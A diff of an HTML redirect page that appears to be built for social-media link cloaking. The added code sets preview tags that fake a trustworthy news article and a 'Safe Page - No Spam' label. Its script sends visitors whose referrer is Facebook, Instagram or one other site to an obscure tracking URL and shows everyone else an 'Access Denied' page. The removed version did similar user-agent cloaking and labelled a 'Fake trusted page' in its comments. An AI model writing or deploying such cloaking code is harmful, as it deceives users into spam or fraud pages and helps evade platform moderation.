@@ -2,29 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Facebook Open Graph Meta Tags -->
+    <meta property="og:title" content="Safe Page - No Spam">
+    <meta property="og:image" content="https://oscam.life/wp-content/uploads/2021/09/post-6@2x.jpg">
+    <meta property="og:description" content="Click to visit the safe page without spam or malicious redirects.">
+    <meta property="og:url" content="https://oscam.life/chip-startup-says-sensors-may-replace-buttons-on-phones/">
+    
     <title>Redirecting...</title>
-
-    <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="Exciting News Update!">
-    <meta property="og:image" content="https://i.imgur.com/Vj9dqPB.jpeg">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://github.com/Asif20-prog/redirect-page4/">
-
-    <!-- Meta Redirect (Backup) -->
-    <meta http-equiv="refresh" content="0;url=https://i.imgur.com/Vj9dqPB.jpeg">
 </head>
 <body>
+    <h2>Redirecting you to a safe page...</h2>
+    
     <script>
-        var userAgent = navigator.userAgent.toLowerCase();
-        var referrer = document.referrer.toLowerCase();
-
-        if (userAgent.includes("facebook") || referrer.includes("facebook.com")) {
-            window.location.href = "https://web.facebook.com/"; // Fake trusted page
+        // Secure Redirect Logic
+        const allowedDomains = ["oscam.life", "facebook.com", "instagram.com"];
+        const targetURL = "https://deceivedaisle.com/ee6xrrjaq?key=f29e6caa649a7fd9033f5e7663d5086f";
+        
+        // Check referrer before redirecting
+        if (document.referrer) {
+            let referrerHost = new URL(document.referrer).hostname;
+            if (allowedDomains.includes(referrerHost)) {
+                console.log("Redirecting to:", targetURL);
+                window.location.href = targetURL;
+            } else {
+                console.warn("Blocked unknown referrer:", referrerHost);
+                document.body.innerHTML = "<h2>Access Denied: Unauthorized Redirect</h2>";
+            }
         } else {
-            window.location.href = "https://web.facebook.com/"; // Real affiliate link
+            console.warn("No referrer detected. Redirect blocked.");
+            document.body.innerHTML = "<h2>Access Denied: No Referrer</h2>";
         }
     </script>
-
-    <p>If you are not redirected, <a href="https://web.facebook.com/">click here</a>.</p>
 </body>
 </html>
